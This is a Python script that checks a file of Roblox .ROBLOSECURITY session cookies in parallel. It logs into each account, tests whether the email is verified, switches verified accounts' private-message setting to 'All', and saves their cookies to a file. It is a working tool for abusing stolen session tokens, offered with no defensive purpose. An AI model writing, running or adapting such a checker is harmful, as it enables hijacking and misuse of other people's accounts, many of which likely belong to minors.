from http.cookiejar import CookiePolicy
from typing import MutableMapping
import requests,time,os,threading,multiprocessing
from requests import cookies
from requests import auth
global cookielist
global done
done = False
global cpm
cpm = 0
print("Starting")
cookielist = open('cookies.txt', 'r').read()
cookielist = cookielist.split("_|")
cookielist.pop(len(cookielist) - 1)
global threadsize,cookperthread,lastthread
threadsize = 50
threadsize = int(threadsize)
cookperthread = len(cookielist)/threadsize
rem = len(cookielist)%threadsize
cookperthread = int(cookperthread)
lastthread = rem
def countCpm():
    while True:
        if done == False:
            global cpm
            cpm = 0
            print("CPM: ", cpm)
            cpm = 0
            time.sleep(60)
        else:
            break
def checkVer(x):
    global startloc
    startloc = x
    global cpm
    while x < len(cookielist) - 1:
        cookie = cookielist[x]
        cookie = f"_|{cookie}"
        cookie = cookie.replace("\n","")
        global isver
        isver = False
        if x >= 829:
            print(x)
        with requests.session() as session:
            session.cookies[".ROBLOSECURITY"] = cookie
            xcsrf = session.post("https://auth.roblox.com/")
            xcsrf = xcsrf.headers["X-CSRF-Token"]
            session.headers["X-CSRF-Token"] = xcsrf
            authinfo = session.get("https://users.roblox.com/v1/users/authenticated")
            if authinfo.status_code == 200:
                verreq = session.get("https://accountsettings.roblox.com/v1/email")
                isver = verreq.json()["verified"]
                if isver == True:
                    privset = session.post("https://accountsettings.roblox.com/v1/private-message-privacy", data={"privateMessagePrivacy":"All"})
                    if(privset.status_code == 200):
                        print("Found verified cookie and set PM settings\n")
                        with open('veraccinfo.txt', 'a') as gen:
                            gen.write(f'{cookie}\n') 
        if x == startloc + cookperthread:
            break
        x += 1
i = 0
startpos = 0
#threading.Thread(target=countCpm(),).start()
time.sleep(.5)
if __name__ == '__main__':
    processes = []
    while i < threadsize:
        p = multiprocessing.Process(target=checkVer,args=(startpos,))
        processes.append(p)
        p.start()
        startpos += cookperthread
        i += 1
    b = multiprocessing.Process(target=checkVer,args=((len(cookielist)-rem,)))
    processes.append(b)
    b.start()
    for process in processes:
        process.join()

